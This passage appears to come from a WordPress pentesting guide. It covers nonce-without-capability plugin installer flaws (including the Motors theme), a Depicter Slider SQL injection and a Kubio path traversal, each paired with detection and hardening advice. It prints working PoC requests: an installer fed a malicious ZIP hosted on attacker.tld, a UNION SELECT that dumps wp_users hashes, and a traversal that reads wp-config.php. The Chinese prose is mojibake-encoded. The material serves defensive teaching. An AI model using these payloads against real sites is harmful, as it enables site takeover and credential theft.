Nonces ç”¨äºé˜²æ­¢ CSRFï¼Œè€Œä¸æ˜¯ç”¨äºæˆæƒã€‚å¦‚æœä»£ç æŠŠ nonce éªŒè¯é€šè¿‡å½“ä½œæ”¾è¡Œä¿¡å·ï¼Œéšåè·³è¿‡å¯¹ç‰¹æƒæ“ä½œï¼ˆä¾‹å¦‚ install/activate pluginsï¼‰çš„ capability æ£€æŸ¥ï¼Œæœªè®¤è¯çš„æ”»å‡»è€…å¯ä»¥æ»¡è¶³å¼±çš„ nonce è¦æ±‚å¹¶é€šè¿‡å®‰è£…å¸¦åé—¨æˆ–è„†å¼±çš„æ’ä»¶è¾¾åˆ° RCEã€‚

- æ˜“å—æ”»å‡»è·¯å¾„ï¼š plugin/install_and_activate
- ç¼ºé™·ï¼šnonce å“ˆå¸Œæ£€æŸ¥è–„å¼±ï¼›ä¸€æ—¦ nonce â€œé€šè¿‡â€ å°±æ²¡æœ‰ current_user_can('install_plugins'|'activate_plugins') æ£€æŸ¥
- å½±å“ï¼šé€šè¿‡ä»»æ„æ’ä»¶å®‰è£…/æ¿€æ´»å¯¼è‡´å®Œå…¨å…¥ä¾µ

PoCï¼ˆå…·ä½“å½¢å¼å–å†³äºæ’ä»¶ï¼›ä»…ä¸ºç¤ºä¾‹ï¼‰
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

### Subscriber+ AJAX plugin installer â†’ å¼ºåˆ¶æ¶æ„æ¿€æ´» (Motors Theme â‰¤ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) å±•ç¤ºäº† Motors theme å¦‚ä½•éšé™„ä¸€ä¸ªç»è¿‡è®¤è¯çš„ AJAX helper ç”¨äºå®‰è£…å…¶ companion pluginï¼š
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- ä»…è°ƒç”¨äº† `check_ajax_referer()`ï¼›æ²¡æœ‰è°ƒç”¨ `current_user_can('install_plugins')` æˆ– `current_user_can('activate_plugins')`ã€‚
- è¯¥ nonce åµŒå…¥åœ¨ Motors ç®¡ç†é¡µé¢ä¸­ï¼Œå› æ­¤ä»»ä½•èƒ½è®¿é—® `/wp-admin/` çš„ Subscriber éƒ½å¯ä»¥ä» HTML/JS ä¸­å¤åˆ¶å®ƒã€‚
- å¤„ç†å™¨ä¿¡ä»»æ”»å‡»è€…æ§åˆ¶çš„ `plugin` å‚æ•°ï¼ˆä» `$_GET` è¯»å–ï¼‰å¹¶å°†å…¶ä¼ é€’ç»™ `Plugin_Upgrader::install()`ï¼Œå› æ­¤ä»»æ„è¿œç¨‹ ZIP ä¼šè¢«ä¸‹è½½åˆ° `wp-content/plugins/`ã€‚
- å®‰è£…åï¼Œä¸»é¢˜æ— æ¡ä»¶åœ°è°ƒç”¨ `mvl_theme_activate_plugin()`ï¼Œç¡®ä¿æ”»å‡»è€…æ’ä»¶çš„ PHP ä»£ç è¢«æ‰§è¡Œã€‚

#### åˆ©ç”¨æµç¨‹

1. æ³¨å†Œ/æ”»ç ´ä¸€ä¸ªä½æƒé™è´¦æˆ·ï¼ˆSubscriber è¶³å¤Ÿï¼‰å¹¶ä» Motors ä»ªè¡¨æ¿ UI è·å– `mvl_theme_install_base` nonceã€‚
2. æ„å»ºä¸€ä¸ªæ’ä»¶ ZIPï¼Œé¡¶å±‚ç›®å½•åŒ¹é…é¢„æœŸçš„ slug `motors-car-dealership-classified-listings/`ï¼Œå¹¶åœ¨ `*.php` å…¥å£æ–‡ä»¶ä¸­åµŒå…¥åé—¨æˆ– webshellã€‚
3. æ‰˜ç®¡è¯¥ ZIP å¹¶é€šè¿‡å°† handler æŒ‡å‘ä½ çš„ URL æ¥è§¦å‘å®‰è£…ç¨‹åºï¼š
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
å› ä¸ºå¤„ç†ç¨‹åºè¯»å– `$_GET['plugin']`ï¼Œç›¸åŒçš„ payload ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢å­—ç¬¦ä¸²å‘é€ã€‚

#### æ£€æµ‹æ¸…å•

- åœ¨ä¸»é¢˜/æ’ä»¶ ä¸­æœç´¢ `Plugin_Upgrader`ã€`Theme_Upgrader` æˆ–è‡ªå®šä¹‰çš„ `install_plugin.php` helpersï¼Œè¿™äº› helpers é€šè¿‡ `wp_ajax_*` é’©å­è¿æ¥ä½†æ²¡æœ‰ capability æ£€æŸ¥ã€‚
- æ£€æŸ¥ä»»ä½•æ¥å— `plugin`ã€`package`ã€`source` æˆ– `url` å‚æ•°å¹¶å°†å…¶ä¼ å…¥ upgrader APIs çš„å¤„ç†ç¨‹åºï¼Œå°¤å…¶å½“ slug æ˜¯ç¡¬ç¼–ç ä½† ZIP å†…å®¹æœªè¢«éªŒè¯æ—¶ã€‚
- å®¡æŸ¥ä¸ºå®‰è£…å™¨æ“ä½œæš´éœ² nonce çš„ç®¡ç†é¡µé¢â€”å¦‚æœ Subscribers èƒ½åŠ è½½è¯¥é¡µé¢ï¼Œåˆ™å‡å®š nonce leaksã€‚

#### åŠ å›º

- åœ¨ nonce éªŒè¯ä¹‹åï¼Œç”¨ `current_user_can('install_plugins')` å’Œ `current_user_can('activate_plugins')` é™åˆ¶å®‰è£…å™¨çš„ AJAX å›è°ƒï¼›Motors 5.6.82 å¼•å…¥äº†æ­¤æ£€æŸ¥ä»¥ä¿®è¡¥è¯¥ bugã€‚
- æ‹’ç»ä¸å—ä¿¡ä»»çš„ URLsï¼šå°†å®‰è£…å™¨é™åˆ¶ä¸ºæ†ç»‘çš„ ZIP æˆ–å—ä¿¡ä»»çš„ repositoriesï¼Œæˆ–å¼ºåˆ¶ä½¿ç”¨ç­¾åä¸‹è½½ manifestsã€‚
- å°† nonces ä¸¥æ ¼è§†ä¸º CSRF tokensï¼›å®ƒä»¬ä¸æä¾›æˆæƒï¼Œç»ä¸åº”æ›¿ä»£ capability æ£€æŸ¥ã€‚

---

## æœªè®¤è¯çš„ SQLiï¼šdepicter-* æ“ä½œä¸­çš„ sï¼ˆsearchï¼‰å‚æ•° (Depicter Slider â‰¤ 3.6.1)

å¤šä¸ª depicter-* æ“ä½œä½¿ç”¨äº† sï¼ˆsearchï¼‰å‚æ•°ï¼Œå¹¶åœ¨æ²¡æœ‰å‚æ•°åŒ–çš„æƒ…å†µä¸‹å°†å…¶ä¸²è”åˆ° SQL æŸ¥è¯¢ä¸­ã€‚

- å‚æ•°ï¼šsï¼ˆsearchï¼‰
- ç¼ºé™·ï¼šåœ¨ WHERE/LIKE å­å¥ä¸­ç›´æ¥è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼›æ²¡æœ‰ä½¿ç”¨ prepared statements/è¿›è¡Œ sanitization
- å½±å“ï¼šdatabase exfiltrationï¼ˆusersã€hashesï¼‰ã€lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in SQL
- Review custom queries passed to $wpdb->get_results()/query() concatenating s

Hardening
- Always use $wpdb->prepare() or wpdb placeholders; reject unexpected metacharacters server-side
- Add a strict allowlist for s and normalize to expected charset/length

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

åœ¨ template å‚æ•°ä¸­æ¥å—æ”»å‡»è€…å¯æ§çš„è·¯å¾„ä¸”æœªåšè§„èŒƒåŒ–/é™åˆ¶ï¼Œä¼šå…è®¸è¯»å–ä»»æ„æœ¬åœ°æ–‡ä»¶ï¼›åœ¨å°†å¯åŒ…å«çš„ PHP/æ—¥å¿— æ–‡ä»¶çº³å…¥è¿è¡Œæ—¶çš„æƒ…å†µä¸‹ï¼Œæœ‰æ—¶è¿˜ä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: no normalization/allowlisting; traversal permitted
- Impact: secret disclosure (wp-config.php), potential RCE in specific environments (log poisoning, includable PHP)

PoC â€“ è¯»å– wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
æ£€æµ‹æ¸…å•
- ä»»ä½•å°†è¯·æ±‚è·¯å¾„æ‹¼æ¥åˆ° include()/require()/read æ•æ„Ÿè°ƒç”¨ç‚¹ä¸”æœªä½¿ç”¨ realpath() è¿›è¡Œçº¦æŸçš„å¤„ç†ç¨‹åº
- æŸ¥æ‰¾ç©¿è¶Šæ¨¡å¼ (../) å¯¼è‡´è®¿é—®é¢„æœŸæ¨¡æ¿ç›®å½•ä»¥å¤–çš„ä½ç½®

åŠ å›º
- å¼ºåˆ¶ä½¿ç”¨ç™½åå•æ¨¡æ¿ï¼›ä½¿ç”¨ realpath() è§£æå¹¶è¦æ±‚ str_starts_with(realpath(file), realpath(allowed_base))
- è§„èŒƒåŒ–è¾“å…¥ï¼›æ‹’ç»ç©¿è¶Šåºåˆ—å’Œç»å¯¹è·¯å¾„ï¼›ä»…å¯¹æ–‡ä»¶åä½¿ç”¨ sanitize_file_name()ï¼ˆä¸è¦ç”¨äºå®Œæ•´è·¯å¾„ï¼‰


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
